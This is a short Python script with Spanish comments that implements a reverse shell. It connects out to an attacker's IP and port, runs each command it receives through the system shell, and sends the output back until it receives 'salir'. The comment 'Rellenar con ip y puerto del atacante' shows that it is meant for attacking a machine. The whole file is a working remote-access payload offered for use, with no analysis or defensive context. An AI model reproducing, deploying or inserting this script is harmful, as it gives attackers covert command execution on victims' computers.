#!/usr/bin/python

import subprocess,socket

# Rellenar con ip y puerto del atacante
HOST = '192.168.0.104'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.send('Empieza la fiesta! Follow the white rabbit...\n\n')
s.send('Introduce el comando a ejecutar: ')

while 1:
	data = s.recv(1024)
	if data == "salir\n":
		break	
	else:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdoutput = proc.stdout.read() + proc.stderr.read()
                s.send(stdoutput)
                s.send('\nIntroduce el comando a ejecutar: ')
# Fin del bucle
s.send('\nEverything that has a beginning has an end!\n')
s.close()
